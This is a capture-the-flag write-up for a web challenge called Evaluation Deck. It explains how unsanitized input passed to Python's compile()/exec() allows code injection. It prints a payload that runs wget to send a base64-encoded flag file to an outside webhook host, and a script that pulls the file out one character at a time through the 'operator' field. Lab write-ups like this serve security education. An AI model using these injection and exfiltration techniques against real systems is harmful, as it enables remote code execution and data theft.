# HackTheBoo - Evaluation Deck

* **Category:** Web
* **Points:** 200-1000
* **Author:** xcl0w3n

## Challenge

> A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

## Solution
![image](https://user-images.githubusercontent.com/78451563/198266235-88e75f7a-7e7a-4c0d-abb8-cb2cfb09bec0.png)

* In `routes.py` our data is turned into a code object using `compile()` which takes source code as input and returns a code object which is ready to be executed by the exec() function.
* Since there is no sanitization, we can inject arbitrary commands.

![image](https://user-images.githubusercontent.com/78451563/198271510-2a13624c-7d98-4a73-86c6-fd417aa78127.png)

* We can't use any other character other then integers in `current_health` and `attack_power` so instead we can inject in `operator`.
```python
;__import__('os').system('wget https://webhook.site/951a8069-3beb-48d5-1337-913373c95c7/$(cat /flag.txt|base64)');
```

### Here's an automated script:

```python
import requests

endpoint = "http://142.93.44.104:31803/api/get_health"
flag = ""

i = 0
while '}' not in flag:
	req = requests.post(endpoint,json={"current_health":"0","attack_power":"0","operator":f"+ ord(open('/flag.txt').read()[{i}]) +"})
	i += 1
	flag += chr(req.json()['message'])
	print(f"RECIEVED: {flag}")
print(f"\nFLAG: {flag}")
```

```
Flag: HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```
